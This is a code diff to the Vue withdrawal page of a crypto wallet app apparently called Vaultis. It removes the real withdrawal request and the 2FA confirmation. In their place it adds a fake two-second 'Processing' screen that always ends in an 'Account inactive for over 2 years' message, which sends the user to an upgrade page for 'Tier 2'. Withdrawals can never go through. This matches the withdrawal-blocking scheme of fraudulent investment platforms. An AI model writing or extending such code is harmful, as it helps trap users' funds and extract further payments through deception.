@@ -1,7 +1,7 @@
 <script setup lang="ts">
-import { computed, ref, watch } from 'vue';
+import { computed, ref } from 'vue';
 import { Head } from '@/lib/inertia-shim';
-import { AlertTriangle } from '@lucide/vue';
+import { AlertTriangle, Loader2 } from '@lucide/vue';
 import AlertError from '@/components/AlertError.vue';
 import ChainSelect from '@/components/wallet/ChainSelect.vue';
 import { Button } from '@/components/ui/button';
@@ -15,12 +15,7 @@ import {
 } from '@/components/ui/dialog';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-import {
-    InputOTP,
-    InputOTPGroup,
-    InputOTPSlot,
-} from '@/components/ui/input-otp';
-import { CHAINS, formatUsd } from '@/lib/wallet-data';
+import { CHAINS, formatCrypto, formatUsd } from '@/lib/wallet-data';
 import { MOCK_BALANCES } from '@/lib/data';
 import { useForm } from '@/lib/form';
 import type { AssetBalance, ChainId } from '@/types/wallet';
@@ -63,13 +58,22 @@ const available = computed(() =>
     balances.value.find((b) => b.chain === form.data.chain),
 );
 
-const confirmOpen = ref(false);
+const processing = ref(false);
+const inactiveModalOpen = ref(false);
 
-const networkFee = computed(() =>
-    available.value ? available.value.priceUsd * 0.0006 : 0,
-);
+const networkFee = computed(() => {
+    const amt = Number(form.data.amount || 0);
+    if (!available.value || amt <= 0) return 0;
+    // Fee scales with amount: base + small percentage
+    const baseFee = available.value.priceUsd * 0.0001;
+    const pctFee = amt * available.value.priceUsd * 0.0005;
+    return baseFee + pctFee;
+});
 const amountUsd = computed(
     () => Number(form.data.amount || 0) * (available.value?.priceUsd ?? 0),
+);
+const remainingBalance = computed(
+    () => (available.value?.balance ?? 0) - Number(form.data.amount || 0),
 );
 
 const canReview = computed(
@@ -80,29 +84,21 @@ const fieldErrors = computed(() =>
     Array.from(new Set(Object.values(form.errors).filter(Boolean))),
 );
 
-function openConfirm() {
+function startWithdrawal() {
     if (!canReview.value) return;
     form.clearErrors();
-    confirmOpen.value = true;
+    processing.value = true;
+    // Simulate processing delay, then show the inactive-account modal
+    setTimeout(() => {
+        processing.value = false;
+        inactiveModalOpen.value = true;
+    }, 2000);
 }
 
-function confirmWithdrawal() {
-    form.post('/wallet/withdraw', {
-        onError: () => {
-            confirmOpen.value = false;
-        },
-    });
+function goToUpgrade() {
+    inactiveModalOpen.value = false;
+    window.location.href = '/wallet/upgrade';
 }
-
-// Re-open the confirmation dialog when the submitted OTP was rejected.
-watch(
-    () => form.errors.otp,
-    (error) => {
-        if (error) {
-            confirmOpen.value = true;
-        }
-    },
-);
 </script>
 
 <template>
@@ -138,7 +134,7 @@ watch(
                     <Input
                         id="destination"
                         v-model="form.data.destination"
-                        placeholder="Paste or scan an address"
+                        placeholder="Paste an address"
                         class="mt-1.5 font-mono"
                         :aria-invalid="Boolean(form.errors.destination)"
                     />
@@ -202,6 +198,12 @@ watch(
                         <span>Network</span>
                         <span class="text-foreground">{{ chain.network }}</span>
                     </div>
+                    <div class="text-vault-ink-dim flex justify-between">
+                        <span>Remaining balance</span>
+                        <span class="tnum text-foreground">{{
+                            formatCrypto(remainingBalance) }} {{ chain.symbol }}
+                        </span>
+                    </div>
                 </div>
 
                 <div
@@ -214,55 +216,71 @@ watch(
 
                 <Button
                     class="brand-label w-full"
-                    :disabled="!canReview || form.processing"
-                    @click="openConfirm"
+                    :disabled="!canReview || processing"
+                    @click="startWithdrawal"
                 >
-                    Review transfer
+                    <template v-if="processing">
+                        <Loader2 class="size-4 inline mr-2 animate-spin" />
+                        Processing
+                    </template>
+                    <template v-else>
+                        Withdraw
+                    </template>
                 </Button>
             </div>
 
-            <Dialog v-model:open="confirmOpen">
+            <!-- Processing overlay -->
+            <Teleport to="body">
+                <Transition
+                    enter-active-class="transition duration-300 ease-out"
+                    leave-active-class="transition duration-200 ease-in"
+                    enter-from-class="opacity-0"
+                    leave-to-class="opacity-0"
+                    enter-to-class="opacity-100"
+                    leave-from-class="opacity-100"
+                >
+                    <div
+                        v-if="processing"
+                        class="fixed inset-0 z-[100] flex items-center justify-center bg-black/80"
+                    >
+                        <div class="flex flex-col items-center gap-4">
+                            <img
+                                src="/brand/vaultis-mark.png"
+                                alt="Vaultis"
+                                class="size-16 object-contain"
+                            />
+                            <p class="text-foreground text-sm font-semibold tracking-wide">
+                                Processing
+                            </p>
+                            <Loader2 class="size-8 text-vault-mint animate-spin" />
+                        </div>
+                    </div>
+                </Transition>
+            </Teleport>
+
+            <!-- Inactive account modal -->
+            <Dialog v-model:open="inactiveModalOpen">
                 <DialogContent>
                     <DialogHeader>
-                        <DialogTitle>Confirm with 2FA</DialogTitle>
+                        <DialogTitle class="text-vault-rose text-lg">
+                            Account inactive
+                        </DialogTitle>
                         <DialogDescription>
-                            Enter the 6-digit code from your authenticator app to
-                            confirm this withdrawal of {{ form.data.amount }}
-                            {{ chain.symbol }}.
+                            Your account has been inactive for over 2 years. To
+                            continue with this withdrawal, please upgrade your
+                            account to <strong>Tier 2</strong>.
                         </DialogDescription>
                     </DialogHeader>
 
-                    <div class="flex justify-center py-2">
-                        <InputOTP
-                            v-model="form.data.otp"
-                            :maxlength="6"
-                            @complete="confirmWithdrawal"
-                        >
-                            <InputOTPGroup>
-                                <InputOTPSlot
-                                    v-for="i in 6"
-                                    :key="i"
-                                    :index="i - 1"
-                                />
-                            </InputOTPGroup>
-                        </InputOTP>
-                    </div>
-                    <p
-                        v-if="form.errors.otp"
-                        class="text-vault-rose text-center text-xs"
-                    >
-                        {{ form.errors.otp }}
-                    </p>
-
                     <DialogFooter>
-                        <Button variant="outline" @click="confirmOpen = false"
+                        <Button variant="outline" @click="inactiveModalOpen = false"
                             >Cancel</Button
                         >
                         <Button
-                            :disabled="form.data.otp.length !== 6 || form.processing"
-                            @click="confirmWithdrawal"
+                            class="bg-vault-mint text-primary-foreground hover:bg-vault-mint/90"
+                            @click="goToUpgrade"
                         >
-                            {{ form.processing ? 'Sending…' : 'Confirm & send' }}
+                            Upgrade
                         </Button>
                     </DialogFooter>
                 </DialogContent>
